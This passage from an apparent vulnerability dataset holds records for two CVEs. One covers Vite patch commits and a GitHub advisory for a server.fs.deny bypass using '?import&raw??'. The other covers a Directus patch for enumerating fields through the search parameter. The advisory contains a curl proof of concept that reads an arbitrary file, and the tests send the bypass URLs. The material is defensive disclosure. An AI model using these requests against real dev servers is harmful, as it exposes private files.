@@\n<h2>Denied</h2>\n       console.error(e)\n     })\n \n+  fetch(\n+    joinUrlSegments(\n+      base,\n+      joinUrlSegments('/@fs/', ROOT) + '/unsafe.json?import&raw??',\n+    ),\n+  )\n+    .then((r) => {\n+      text('.unsafe-fs-fetch-raw-query1-status', r.status)\n+      return r.json()\n+    })\n+    .then((data) => {\n+      text('.unsafe-fs-fetch-raw-query1', JSON.stringify(data))\n+    })\n+    .catch((e) => {\n+      console.error(e)\n+    })\n+\n+  fetch(\n+    joinUrlSegments(\n+      base,\n+      joinUrlSegments('/@fs/', ROOT) + '/unsafe.json?import&raw?&',\n+    ),\n+  )\n+    .then((r) => {\n+      text('.unsafe-fs-fetch-raw-query2-status', r.status)\n+      return r.json()\n+    })\n+    .then((data) => {\n+      text('.unsafe-fs-fetch-raw-query2', JSON.stringify(data))\n+    })\n+    .catch((e) => {\n+      console.error(e)\n+    })\n+\n   // outside root with special characters #8498\n   fetch(\n     joinUrlSegments(\n```",
                "url": "https://github.com/vitejs/vite/commit/80381c38d6f068b12e6e928cd3c616bd1d64803c"
            },
            {
                "content": "fix: backport #19702, fs raw query with query separators (#19703)\n\nFilename: packages/vite/src/node/server/middlewares/transform.ts:\n```\n@@ -41,6 +41,7 @@\nimport { ensureServingAccess } from './static'\n const debugCache = createDebugger('vite:cache')\n \n const knownIgnoreList = new Set(['/', '/favicon.ico'])\n+const trailingQuerySeparatorsRE = /[?&]+$/\n \n /**\n  * A middleware that short-circuits the middleware chain to serve cached transformed modules\n\n@@ -163,9 +164,19 @@\nexport function transformMiddleware(\n         warnAboutExplicitPublicPathInUrl(url)\n       }\n \n+      const urlWithoutTrailingQuerySeparators = url.replace(\n+        trailingQuerySeparatorsRE,\n+        '',\n+      )\n       if (\n-        (rawRE.test(url) || urlRE.test(url)) &&\n-        !ensureServingAccess(url, server, res, next)\n+        (rawRE.test(urlWithoutTrailingQuerySeparators) ||\n+          urlRE.test(urlWithoutTrailingQuerySeparators)) &&\n+        !ensureServingAccess(\n+          urlWithoutTrailingQuerySeparators,\n+          server,\n+          res,\n+          next,\n+        )\n       ) {\n         return\n       }\n```\n\nFilename: playground/fs-serve/__tests__/fs-serve.spec.ts:\n```\n@@ -96,6 +96,20 @@\ndescribe.runIf(isServe)('main', () => {\n     expect(await page.textContent('.unsafe-fs-fetch-raw-status')).toBe('403')\n   })\n \n+  test('unsafe fs fetch query 1', async () => {\n+    expect(await page.textContent('.unsafe-fs-fetch-raw-query1')).toBe('')\n+    expect(await page.textContent('.unsafe-fs-fetch-raw-query1-status')).toBe(\n+      '403',\n+    )\n+  })\n+\n+  test('unsafe fs fetch query 2', async () => {\n+    expect(await page.textContent('.unsafe-fs-fetch-raw-query2')).toBe('')\n+    expect(await page.textContent('.unsafe-fs-fetch-raw-query2-status')).toBe(\n+      '403',\n+    )\n+  })\n+\n   test('unsafe fs fetch with special characters (#8498)', async () => {\n     expect(await page.textContent('.unsafe-fs-fetch-8498')).toBe('')\n     expect(await page.textContent('.unsafe-fs-fetch-8498-status')).toBe('404')\n```\n\nFilename: playground/fs-serve/root/src/index.html:\n```\n@@ -37,6 +37,10 @@\n<h2>Unsafe /@fs/ Fetch</h2>\n <pre class=\"unsafe-fs-fetch\"></pre>\n <pre class=\"unsafe-fs-fetch-raw-status\"></pre>\n <pre class=\"unsafe-fs-fetch-raw\"></pre>\n+<pre class=\"unsafe-fs-fetch-raw-query1-status\"></pre>\n+<pre class=\"unsafe-fs-fetch-raw-query1\"></pre>\n+<pre class=\"unsafe-fs-fetch-raw-query2-status\"></pre>\n+<pre class=\"unsafe-fs-fetch-raw-query2\"></pre>\n <pre class=\"unsafe-fs-fetch-8498-status\"></pre>\n <pre class=\"unsafe-fs-fetch-8498\"></pre>\n <pre class=\"unsafe-fs-fetch-8498-2-status\"></pre>\n\n@@ -209,6 +213,40 @@\n<h2>Denied</h2>\n       console.error(e)\n     })\n \n+  fetch(\n+    joinUrlSegments(\n+      base,\n+      joinUrlSegments('/@fs/', ROOT) + '/unsafe.json?import&raw??',\n+    ),\n+  )\n+    .then((r) => {\n+      text('.unsafe-fs-fetch-raw-query1-status', r.status)\n+      return r.json()\n+    })\n+    .then((data) => {\n+      text('.unsafe-fs-fetch-raw-query1', JSON.stringify(data))\n+    })\n+    .catch((e) => {\n+      console.error(e)\n+    })\n+\n+  fetch(\n+    joinUrlSegments(\n+      base,\n+      joinUrlSegments('/@fs/', ROOT) + '/unsafe.json?import&raw?&',\n+    ),\n+  )\n+    .then((r) => {\n+      text('.unsafe-fs-fetch-raw-query2-status', r.status)\n+      return r.json()\n+    })\n+    .then((data) => {\n+      text('.unsafe-fs-fetch-raw-query2', JSON.stringify(data))\n+    })\n+    .catch((e) => {\n+      console.error(e)\n+    })\n+\n   // outside root with special characters #8498\n   fetch(\n     joinUrlSegments(\n```",
                "url": "https://github.com/vitejs/vite/commit/807d7f06d33ab49c48a2a3501da3eea1906c0d41"
            },
            {
                "content": "fix: fs raw query with query separators (#19702)\n\nFilename: packages/vite/src/node/server/middlewares/transform.ts:\n```\n@@ -43,6 +43,7 @@\nimport { ensureServingAccess } from './static'\n const debugCache = createDebugger('vite:cache')\n \n const knownIgnoreList = new Set(['/', '/favicon.ico'])\n+const trailingQuerySeparatorsRE = /[?&]+$/\n \n /**\n  * A middleware that short-circuits the middleware chain to serve cached transformed modules\n\n@@ -169,9 +170,19 @@\nexport function transformMiddleware(\n         warnAboutExplicitPublicPathInUrl(url)\n       }\n \n+      const urlWithoutTrailingQuerySeparators = url.replace(\n+        trailingQuerySeparatorsRE,\n+        '',\n+      )\n       if (\n-        (rawRE.test(url) || urlRE.test(url)) &&\n-        !ensureServingAccess(url, server, res, next)\n+        (rawRE.test(urlWithoutTrailingQuerySeparators) ||\n+          urlRE.test(urlWithoutTrailingQuerySeparators)) &&\n+        !ensureServingAccess(\n+          urlWithoutTrailingQuerySeparators,\n+          server,\n+          res,\n+          next,\n+        )\n       ) {\n         return\n       }\n```\n\nFilename: playground/fs-serve/__tests__/fs-serve.spec.ts:\n```\n@@ -96,6 +96,20 @@\ndescribe.runIf(isServe)('main', () => {\n     expect(await page.textContent('.unsafe-fs-fetch-raw-status')).toBe('403')\n   })\n \n+  test('unsafe fs fetch query 1', async () => {\n+    expect(await page.textContent('.unsafe-fs-fetch-raw-query1')).toBe('')\n+    expect(await page.textContent('.unsafe-fs-fetch-raw-query1-status')).toBe(\n+      '403',\n+    )\n+  })\n+\n+  test('unsafe fs fetch query 2', async () => {\n+    expect(await page.textContent('.unsafe-fs-fetch-raw-query2')).toBe('')\n+    expect(await page.textContent('.unsafe-fs-fetch-raw-query2-status')).toBe(\n+      '403',\n+    )\n+  })\n+\n   test('unsafe fs fetch with special characters (#8498)', async () => {\n     expect(await page.textContent('.unsafe-fs-fetch-8498')).toBe('')\n     expect(await page.textContent('.unsafe-fs-fetch-8498-status')).toBe('404')\n```\n\nFilename: playground/fs-serve/root/src/index.html:\n```\n@@ -37,6 +37,10 @@\n<h2>Unsafe /@fs/ Fetch</h2>\n <pre class=\"unsafe-fs-fetch\"></pre>\n <pre class=\"unsafe-fs-fetch-raw-status\"></pre>\n <pre class=\"unsafe-fs-fetch-raw\"></pre>\n+<pre class=\"unsafe-fs-fetch-raw-query1-status\"></pre>\n+<pre class=\"unsafe-fs-fetch-raw-query1\"></pre>\n+<pre class=\"unsafe-fs-fetch-raw-query2-status\"></pre>\n+<pre class=\"unsafe-fs-fetch-raw-query2\"></pre>\n <pre class=\"unsafe-fs-fetch-8498-status\"></pre>\n <pre class=\"unsafe-fs-fetch-8498\"></pre>\n <pre class=\"unsafe-fs-fetch-8498-2-status\"></pre>\n\n@@ -209,6 +213,40 @@\n<h2>Denied</h2>\n       console.error(e)\n     })\n \n+  fetch(\n+    joinUrlSegments(\n+      base,\n+      joinUrlSegments('/@fs/', ROOT) + '/unsafe.json?import&raw??',\n+    ),\n+  )\n+    .then((r) => {\n+      text('.unsafe-fs-fetch-raw-query1-status', r.status)\n+      return r.json()\n+    })\n+    .then((data) => {\n+      text('.unsafe-fs-fetch-raw-query1', JSON.stringify(data))\n+    })\n+    .catch((e) => {\n+      console.error(e)\n+    })\n+\n+  fetch(\n+    joinUrlSegments(\n+      base,\n+      joinUrlSegments('/@fs/', ROOT) + '/unsafe.json?import&raw?&',\n+    ),\n+  )\n+    .then((r) => {\n+      text('.unsafe-fs-fetch-raw-query2-status', r.status)\n+      return r.json()\n+    })\n+    .then((data) => {\n+      text('.unsafe-fs-fetch-raw-query2', JSON.stringify(data))\n+    })\n+    .catch((e) => {\n+      console.error(e)\n+    })\n+\n   // outside root with special characters #8498\n   fetch(\n     joinUrlSegments(\n```",
                "url": "https://github.com/vitejs/vite/commit/92ca12dc79118bf66f2b32ff81ed09e0d0bd07ca"
            },
            {
                "content": "fix: fs raw query with query separators (#19702)\n\nFilename: packages/vite/src/node/server/middlewares/transform.ts:\n```\n@@ -43,6 +43,7 @@\nimport { ensureServingAccess } from './static'\n const debugCache = createDebugger('vite:cache')\n \n const knownIgnoreList = new Set(['/', '/favicon.ico'])\n+const trailingQuerySeparatorsRE = /[?&]+$/\n \n /**\n  * A middleware that short-circuits the middleware chain to serve cached transformed modules\n\n@@ -169,9 +170,19 @@\nexport function transformMiddleware(\n         warnAboutExplicitPublicPathInUrl(url)\n       }\n \n+      const urlWithoutTrailingQuerySeparators = url.replace(\n+        trailingQuerySeparatorsRE,\n+        '',\n+      )\n       if (\n-        (rawRE.test(url) || urlRE.test(url)) &&\n-        !ensureServingAccess(url, server, res, next)\n+        (rawRE.test(urlWithoutTrailingQuerySeparators) ||\n+          urlRE.test(urlWithoutTrailingQuerySeparators)) &&\n+        !ensureServingAccess(\n+          urlWithoutTrailingQuerySeparators,\n+          server,\n+          res,\n+          next,\n+        )\n       ) {\n         return\n       }\n```\n\nFilename: playground/fs-serve/__tests__/fs-serve.spec.ts:\n```\n@@ -96,6 +96,20 @@\ndescribe.runIf(isServe)('main', () => {\n     expect(await page.textContent('.unsafe-fs-fetch-raw-status')).toBe('403')\n   })\n \n+  test('unsafe fs fetch query 1', async () => {\n+    expect(await page.textContent('.unsafe-fs-fetch-raw-query1')).toBe('')\n+    expect(await page.textContent('.unsafe-fs-fetch-raw-query1-status')).toBe(\n+      '403',\n+    )\n+  })\n+\n+  test('unsafe fs fetch query 2', async () => {\n+    expect(await page.textContent('.unsafe-fs-fetch-raw-query2')).toBe('')\n+    expect(await page.textContent('.unsafe-fs-fetch-raw-query2-status')).toBe(\n+      '403',\n+    )\n+  })\n+\n   test('unsafe fs fetch with special characters (#8498)', async () => {\n     expect(await page.textContent('.unsafe-fs-fetch-8498')).toBe('')\n     expect(await page.textContent('.unsafe-fs-fetch-8498-status')).toBe('404')\n```\n\nFilename: playground/fs-serve/root/src/index.html:\n```\n@@ -37,6 +37,10 @@\n<h2>Unsafe /@fs/ Fetch</h2>\n <pre class=\"unsafe-fs-fetch\"></pre>\n <pre class=\"unsafe-fs-fetch-raw-status\"></pre>\n <pre class=\"unsafe-fs-fetch-raw\"></pre>\n+<pre class=\"unsafe-fs-fetch-raw-query1-status\"></pre>\n+<pre class=\"unsafe-fs-fetch-raw-query1\"></pre>\n+<pre class=\"unsafe-fs-fetch-raw-query2-status\"></pre>\n+<pre class=\"unsafe-fs-fetch-raw-query2\"></pre>\n <pre class=\"unsafe-fs-fetch-8498-status\"></pre>\n <pre class=\"unsafe-fs-fetch-8498\"></pre>\n <pre class=\"unsafe-fs-fetch-8498-2-status\"></pre>\n\n@@ -209,6 +213,40 @@\n<h2>Denied</h2>\n       console.error(e)\n     })\n \n+  fetch(\n+    joinUrlSegments(\n+      base,\n+      joinUrlSegments('/@fs/', ROOT) + '/unsafe.json?import&raw??',\n+    ),\n+  )\n+    .then((r) => {\n+      text('.unsafe-fs-fetch-raw-query1-status', r.status)\n+      return r.json()\n+    })\n+    .then((data) => {\n+      text('.unsafe-fs-fetch-raw-query1', JSON.stringify(data))\n+    })\n+    .catch((e) => {\n+      console.error(e)\n+    })\n+\n+  fetch(\n+    joinUrlSegments(\n+      base,\n+      joinUrlSegments('/@fs/', ROOT) + '/unsafe.json?import&raw?&',\n+    ),\n+  )\n+    .then((r) => {\n+      text('.unsafe-fs-fetch-raw-query2-status', r.status)\n+      return r.json()\n+    })\n+    .then((data) => {\n+      text('.unsafe-fs-fetch-raw-query2', JSON.stringify(data))\n+    })\n+    .catch((e) => {\n+      console.error(e)\n+    })\n+\n   // outside root with special characters #8498\n   fetch(\n     joinUrlSegments(\n```",
                "url": "https://github.com/vitejs/vite/commit/f234b5744d8b74c95535a7b82cc88ed2144263c1"
            }
        ],
        "published_date": "2025-03-24T17:03:40.728Z",
        "sec_adv": [
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\nvitejs\n/\nvite\nPublic\nSponsor\nNotifications You must be signed in to change notification settings\nFork 6.7k\nStar 72.7k\nCode\nIssues\n473\nPull requests\n162\nDiscussions\nActions\nProjects\n1\nSecurity\n12\nInsights\nAdditional navigation options\nserver.fs.deny bypassed when using `?raw??`\nModerate sapphi-red published GHSA-x574-m823-4x7w on Mar 24Mar 24, 2025\nPackage\nnpm vite\n(\nnpm\n)\nAffected versions\n>=6.2.0, <=6.2.2\n>=6.1.0, <=6.1.1\n>=6.0.0, <=6.0.11\n>=5.0.0, <=5.4.14\n<=4.5.9\nPatched versions\n>=6.2.3\n>=6.1.2, <6.2.0\n>=6.0.12, <6.1.0\n>=5.4.15, <6.0.0\n>=4.5.10, <5.0.0\nDescription\nSummary\nThe contents of arbitrary files can be returned to the browser.\nImpact\nOnly apps explicitly exposing the Vite dev server to the network (using --host or server.host config option) are affected.\nDetails\n@fs denies access to files outside of Vite serving allow list. Adding ?raw?? or ?import&raw?? to the URL bypasses this limitation and returns the file content if it exists. This bypass exists because trailing separators such as ? are removed in several places, but are not accounted for in query string regexes.\nPoC\n$ npm create vite@latest\n$ cd vite-project/\n$ npm install\n$ npm run dev\n\n$ echo \"top secret content\" > /tmp/secret.txt\n\n# expected behaviour\n$ curl \"http://localhost:5173/@fs/tmp/secret.txt\"\n\n    <body>\n      <h1>403 Restricted</h1>\n      <p>The request url &quot;/tmp/secret.txt&quot; is outside of Vite serving allow list.\n\n# security bypassed\n$ curl \"http://localhost:5173/@fs/tmp/secret.txt?import&raw??\"\nexport default \"top secret content\\n\"\n//# sourceMappingURL=data:application/json;base64,eyJ2...\nSeverity\nModerate\n5.3\n/ 10\nCVSS v3 base metrics\nAttack vector\nNetwork\nAttack complexity\nHigh\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nNone\nAvailability\nNone\nLearn more about base metrics\nCVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N\nCVE ID\nCVE-2025-30208\nWeaknesses\nCWE-200 CWE-284\nCredits\nEzzer17\nReporter\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": true,
                "effective_reason": "The security advisory contains a section labeled 'PoC' that explains the steps to reproduce the vulnerability, along with example code and commands.",
                "url": "https://github.com/vitejs/vite/security/advisories/GHSA-x574-m823-4x7w"
            }
        ],
        "sw_version": "v4.5.9",
        "sw_version_wget": "https://github.com/vitejs/vite/archive/refs/tags/v4.5.9.zip"
    },
    "CVE-2025-30352": {
        "cwe": [
            {
                "id": "CWE-200",
                "value": "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor"
            }
        ],
        "description": "Directus is a real-time API and App dashboard for managing SQL database content. Starting in version 9.0.0-alpha.4 and prior to version 11.5.0, the `search` query parameter allows users with access to a collection to filter items based on fields they do not have permission to view. This allows the enumeration of unknown field contents. The searchable columns (numbers & strings) are not checked against permissions when injecting the `where` clauses for applying the search query. This leads to the possibility of enumerating those un-permitted fields. Version 11.5.0 fixes the issue.",
        "languages": [
            "TypeScript"
        ],
        "patch_commits": [
            {
                "content": "Merge from fork (#24715)\n\n* remove forbidden fields from search query\n\n* add some basic tests\n\n* account for admin\n\n* account for field permissions on a per item basis\n\n* prefer where over unnecessary orWhere\n\n* move search to after filter for correct aliasmap\n\n* allowedfields should pull in from all applicable permission rules\n\n* do not add fallback unless necessary\n\n* fix meta service\n\n* do not access invalid this\n\n* fix meta filter/total count\n\nCo-Authored-By: Hannes K\u00fcttner <4376726+hanneskuettner@users.noreply.github.com>\n\n* properly account for field type fallback\n\n* fix tests\n\n* acount for `*` field rules\n\n* Update apply-query.ts\n\n---------\n\nCo-authored-by: daedalus <44623501+ComfortablyCoding@users.noreply.github.com>\nCo-authored-by: Hannes K\u00fcttner <4376726+hanneskuettner@users.noreply.github.com>\n\nFilename: api/src/database/helpers/number/dialects/mssql.ts:\n```\n@@ -1,17 +1,18 @@\n+import type { NumericValue } from '@directus/types';\n import type { Knex } from 'knex';\n+import { NumberDatabaseHelper, type NumberInfo } from '../types.js';\n import { maybeStringifyBigInt } from '../utils/maybe-stringify-big-int.js';\n import { numberInRange } from '../utils/number-in-range.js';\n-import { NumberDatabaseHelper, type NumberInfo } from '../types.js';\n-import type { NumericValue } from '@directus/types';\n \n export class NumberHelperMSSQL extends NumberDatabaseHelper {\n \toverride addSearchCondition(\n \t\tdbQuery: Knex.QueryBuilder,\n \t\tcollection: string,\n \t\tname: string,\n \t\tvalue: NumericValue,\n+\t\tlogical: 'and' | 'or',\n \t): Knex.QueryBuilder {\n-\t\treturn dbQuery.orWhere({ [`${collection}.${name}`]: maybeStringifyBigInt(value) });\n+\t\treturn dbQuery[logical].where({ [`${collection}.${name}`]: maybeStringifyBigInt(value) });\n \t}\n \n \toverride isNumberValid(value: NumericValue, info: NumberInfo) {\n```\n\nFilename: api/src/database/helpers/number/dialects/oracle.ts:\n```\n@@ -1,6 +1,6 @@\n+import type { NumericValue } from '@directus/types';\n import type { Knex } from 'knex';\n import { NumberDatabaseHelper } from '../types.js';\n-import type { NumericValue } from '@directus/types';\n import { maybeStringifyBigInt } from '../utils/maybe-stringify-big-int.js';\n \n export class NumberHelperOracle extends NumberDatabaseHelper {\n\n@@ -9,7 +9,8 @@\nexport class NumberHelperOracle extends NumberDatabaseHelper {\n \t\tcollection: string,\n \t\tname: string,\n \t\tvalue: NumericValue,\n+\t\tlogical: 'and' | 'or',\n \t): Knex.QueryBuilder {\n-\t\treturn dbQuery.orWhere({ [`${collection}.${name}`]: maybeStringifyBigInt(value) });\n+\t\treturn dbQuery[logical].where({ [`${collection}.${name}`]: maybeStringifyBigInt(value) });\n \t}\n }\n```\n\nFilename: api/src/database/helpers/number/dialects/sqlite.ts:\n```\n@@ -1,6 +1,6 @@\n+import type { NumericValue } from '@directus/types';\n import type { Knex } from 'knex';\n import { NumberDatabaseHelper } from '../types.js';\n-import type { NumericValue } from '@directus/types';\n import { maybeStringifyBigInt } from '../utils/maybe-stringify-big-int.js';\n \n export class NumberHelperSQLite extends NumberDatabaseHelper {\n\n@@ -9,7 +9,8 @@\nexport class NumberHelperSQLite extends NumberDatabaseHelper {\n \t\tcollection: string,\n \t\tname: string,\n \t\tvalue: NumericValue,\n+\t\tlogical: 'and' | 'or',\n \t): Knex.QueryBuilder {\n-\t\treturn dbQuery.orWhere({ [`${collection}.${name}`]: maybeStringifyBigInt(value) });\n+\t\treturn dbQuery[logical].where({ [`${collection}.${name}`]: maybeStringifyBigInt(value) });\n \t}\n }\n```\n\nFilename: api/src/database/helpers/number/types.ts:\n```\n@@ -1,6 +1,6 @@\n+import type { NumericType, NumericValue } from '@directus/types';\n import type { Knex } from 'knex';\n import { DatabaseHelper } from '../types.js';\n-import type { NumericType, NumericValue } from '@directus/types';\n \n export type NumberInfo = {\n \ttype: NumericType;\n\n@@ -14,8 +14,9 @@\nexport abstract class NumberDatabaseHelper extends DatabaseHelper {\n \t\tcollection: string,\n \t\tname: string,\n \t\tvalue: NumericValue,\n+\t\tlogical: 'and' | 'or',\n \t): Knex.QueryBuilder {\n-\t\treturn dbQuery.orWhere({ [`${collection}.${name}`]: value });\n+\t\treturn dbQuery[logical].where({ [`${collection}.${name}`]: value });\n \t}\n \n \tisNumberValid(_value: NumericValue, _info: NumberInfo) {\n```\n\nFilename: api/src/services/meta.ts:\n```\n@@ -1,12 +1,11 @@\n-import type { Accountability, Filter, Permission, Query, SchemaOverview } from '@directus/types';\n+import type { Accountability, Query, SchemaOverview } from '@directus/types';\n import type { Knex } from 'knex';\n+import { isArray } from 'lodash-es';\n+import { getAstFromQuery } from '../database/get-ast-from-query/get-ast-from-query.js';\n import getDatabase from '../database/index.js';\n-import { fetchPermissions } from '../permissions/lib/fetch-permissions.js';\n-import { fetchPolicies } from '../permissions/lib/fetch-policies.js';\n-import { dedupeAccess } from '../permissions/modules/process-ast/utils/dedupe-access.js';\n-import { validateAccess } from '../permissions/modules/validate-access/validate-access.js';\n+import { runAst } from '../database/run-ast/run-ast.js';\n+import { processAst } from '../permissions/modules/process-ast/process-ast.js';\n import type { AbstractServiceOptions } from '../types/index.js';\n-import { applyFilter, applySearch } from '../utils/apply-query.js';\n \n export class MetaService {\n \tknex: Knex;\n\n@@ -39,124 +38,39 @@\nexport class MetaService {\n \t}\n \n \tasync totalCount(collection: string): Promise<number> {\n-\t\tconst dbQuery = this.knex(collection);\n-\n-\t\tlet hasJoins = false;\n-\n-\t\tif (this.accountability && this.accountability.admin === false) {\n-\t\t\tconst context = { knex: this.knex, schema: this.schema };\n-\n-\t\t\tawait validateAccess(\n-\t\t\t\t{\n-\t\t\t\t\taccountability: this.accountability,\n-\t\t\t\t\taction: 'read',\n-\t\t\t\t\tcollection,\n-\t\t\t\t},\n-\t\t\t\tcontext,\n-\t\t\t);\n-\n-\t\t\tconst policies = await fetchPolicies(this.accountability, context);\n-\n-\t\t\tconst permissions = await fetchPermissions(\n-\t\t\t\t{\n-\t\t\t\t\taction: 'read',\n-\t\t\t\t\tpolicies,\n-\t\t\t\t\taccountability: this.accountability,\n-\t\t\t\t},\n-\t\t\t\tcontext,\n-\t\t\t);\n-\n-\t\t\tconst collectionPermissions = permissions.filter((permission) => permission.collection === collection);\n-\n-\t\t\tconst rules = dedupeAccess(collectionPermissions);\n-\t\t\tconst cases = rules.map(({ rule }) => rule);\n-\n-\t\t\tconst filter = {\n-\t\t\t\t_or: cases,\n-\t\t\t};\n-\n-\t\t\tconst result = applyFilter(this.knex, this.schema, dbQuery, filter, collection, {}, cases, permissions);\n-\t\t\thasJoins = result.hasJoins;\n-\t\t}\n-\n-\t\tif (hasJoins) {\n-\t\t\tconst primaryKeyName = this.schema.collections[collection]!.primary;\n-\n-\t\t\tdbQuery.countDistinct({ count: [`${collection}.${primaryKeyName}`] });\n-\t\t} else {\n-\t\t\tdbQuery.count('*', { as: 'count' });\n-\t\t}\n-\n-\t\tconst result = await dbQuery.first();\n-\n-\t\treturn Number(result?.count ?? 0);\n+\t\treturn this.filterCount(collection, {});\n \t}\n \n \tasync filterCount(collection: string, query: Query): Promise<number> {\n-\t\tconst dbQuery = this.knex(collection);\n-\n-\t\tlet filter = query.filter || {};\n-\t\tlet hasJoins = false;\n-\t\tlet cases: Filter[] = [];\n-\t\tlet permissions: Permission[] = [];\n-\n-\t\tif (this.accountability && this.accountability.admin === false) {\n-\t\t\tconst context = { knex: this.knex, schema: this.schema };\n-\n-\t\t\tawait validateAccess(\n-\t\t\t\t{\n-\t\t\t\t\taccountability: this.accountability,\n-\t\t\t\t\taction: 'read',\n-\t\t\t\t\tcollection,\n-\t\t\t\t},\n-\t\t\t\tcontext,\n-\t\t\t);\n-\n-\t\t\tconst policies = await fetchPolicies(this.accountability, context);\n-\n-\t\t\tpermissions = await fetchPermissions(\n-\t\t\t\t{\n-\t\t\t\t\taction: 'read',\n-\t\t\t\t\tpolicies,\n-\t\t\t\t\taccountability: this.accountability,\n-\t\t\t\t},\n-\t\t\t\tcontext,\n-\t\t\t);\n-\n-\t\t\tconst collectionPermissions = permissions.filter((permission) => permission.collection === collection);\n-\n-\t\t\tconst rules = dedupeAccess(collectionPermissions);\n-\t\t\tcases = rules.map(({ rule }) => rule);\n-\n-\t\t\tconst permissionsFilter = {\n-\t\t\t\t_or: cases,\n-\t\t\t};\n-\n-\t\t\tif (Object.keys(filter).length > 0) {\n-\t\t\t\tfilter = { _and: [permissionsFilter, filter] };\n-\t\t\t} else {\n-\t\t\t\tfilter = permissionsFilter;\n-\t\t\t}\n-\t\t}\n-\n-\t\tif (Object.keys(filter).length > 0) {\n-\t\t\t({ hasJoins } = applyFilter(this.knex, this.schema, dbQuery, filter, collection, {}, cases, permissions));\n-\t\t}\n-\n-\t\tif (query.search) {\n-\t\t\tapplySearch(this.knex, this.schema, dbQuery, query.search, collection);\n-\t\t}\n-\n-\t\tif (hasJoins) {\n-\t\t\tconst primaryKeyName = this.schema.collections[collection]!.primary;\n+\t\tconst aggregateQuery: Query = {\n+\t\t\taggregate: {\n+\t\t\t\tcount: ['*'],\n+\t\t\t},\n+\t\t\tsearch: query.search ?? null,\n+\t\t\tfilter: query.filter ?? null,\n+\t\t};\n+\n+\t\tlet ast = await getAstFromQuery(\n+\t\t\t{\n+\t\t\t\tcollection,\n+\t\t\t\tquery: aggregateQuery,\n+\t\t\t\taccountability: this.accountability,\n+\t\t\t},\n+\t\t\t{\n+\t\t\t\tschema: this.schema,\n+\t\t\t\tknex: this.knex,\n+\t\t\t},\n+\t\t);\n \n-\t\t\tdbQuery.countDistinct({ count: [`${collection}.${primaryKeyName}`] });\n-\t\t} else {\n-\t\t\tdbQuery.count('*', { as: 'count' });\n-\t\t}\n+\t\tast = await processAst(\n+\t\t\t{ ast, action: 'read', accountability: this.accountability },\n+\t\t\t{ knex: this.knex, schema: this.schema },\n+\t\t);\n \n-\t\tconst result = await dbQuery.first();\n+\t\tconst records = await runAst(ast, this.schema, this.accountability, {\n+\t\t\tknex: this.knex,\n+\t\t});\n \n-\t\treturn Number(result?.count ?? 0);\n+\t\treturn Number((isArray(records) ? records[0]?.['count'] : records?.['count']) ?? 0);\n \t}\n }\n```\n\nFilename: api/src/utils/apply-query.test.ts:\n```\n@@ -1,5 +1,5 @@\n-import type { SchemaOverview } from '@directus/types';\n-import knex from 'knex';\n+import type { Permission, SchemaOverview } from '@directus/types';\n+import knex, { Knex } from 'knex';\n import { MockClient, createTracker } from 'knex-mock-client';\n import { describe, expect, test, vi } from 'vitest';\n import { applyFilter, applySearch } from './apply-query.js';\n\n@@ -28,6 +28,20 @@\nconst FAKE_SCHEMA: SchemaOverview = {\n \t\t\t\t\tvalidation: null,\n \t\t\t\t\talias: false,\n \t\t\t\t},\n+\t\t\t\ttext1: {\n+\t\t\t\t\tfield: 'text',\n+\t\t\t\t\tdefaultValue: null,\n+\t\t\t\t\tnullable: false,\n+\t\t\t\t\tgenerated: false,\n+\t\t\t\t\ttype: 'text',\n+\t\t\t\t\tdbType: null,\n+\t\t\t\t\tprecision: null,\n+\t\t\t\t\tscale: null,\n+\t\t\t\t\tspecial: [],\n+\t\t\t\t\tnote: null,\n+\t\t\t\t\tvalidation: null,\n+\t\t\t\t\talias: false,\n+\t\t\t\t},\n \t\t\t\tfloat: {\n \t\t\t\t\tfield: 'float',\n \t\t\t\t\tdefaultValue: null,\n\n@@ -76,10 +90,26 @@\nconst FAKE_SCHEMA: SchemaOverview = {\n \trelations: [],\n };\n \n+const permissions = [\n+\t{\n+\t\tcollection: 'test',\n+\t\taction: 'read',\n+\t\tfields: ['text', 'float', 'integer', 'id'],\n+\t\tpermissions: {\n+\t\t\ttext: {},\n+\t\t},\n+\t},\n+] as unknown as Permission[];\n+\n class Client_SQLite3 extends MockClient {}\n \n describe('applySearch', () => {\n \tfunction mockDatabase(dbClient: string = 'Client_SQLite3') {\n+\t\tconst whereQueries = {\n+\t\t\twhereRaw: vi.fn(() => self),\n+\t\t\twhere: vi.fn(() => self),\n+\t\t};\n+\n \t\tconst self: Record<string, any> = {\n \t\t\tclient: {\n \t\t\t\tconstructor: {\n\n@@ -89,6 +119,8 @@\ndescribe('applySearch', () => {\n \t\t\tandWhere: vi.fn(() => self),\n \t\t\torWhere: vi.fn(() => self),\n \t\t\torWhereRaw: vi.fn(() => self),\n+\t\t\tand: whereQueries,\n+\t\t\tor: whereQueries,\n \t\t};\n \n \t\treturn self;\n\n@@ -98,58 +130,239 @@\ndescribe('applySearch', () => {\n \t\t'Prevent %s from being cast to number',\n \t\tasync (number) => {\n \t\t\tconst db = mockDatabase();\n+\t\t\tconst queryBuilder = db as any;\n \n-\t\t\tdb['andWhere'].mockImplementation((callback: () => void) => {\n-\t\t\t\t// detonate the andWhere function\n-\t\t\t\tcallback.call(db);\n-\t\t\t\treturn db;\n+\t\t\tdb['andWhere'].mockImplementation((callback: (queryBuilder: Knex.QueryBuilder) => void) => {\n+\t\t\t\tcallback(queryBuilder);\n+\t\t\t\treturn queryBuilder;\n \t\t\t});\n \n-\t\t\tapplySearch(db as any, FAKE_SCHEMA, db as any, number, 'test');\n+\t\t\tqueryBuilder['orWhere'].mockImplementation((callback: (queryBuilder: Knex.QueryBuilder) => void) => {\n+\t\t\t\tcallback(queryBuilder);\n+\t\t\t\treturn queryBuilder;\n+\t\t\t});\n+\n+\t\t\tapplySearch(db as any, FAKE_SCHEMA, queryBuilder, number, 'test', {}, permissions);\n \n 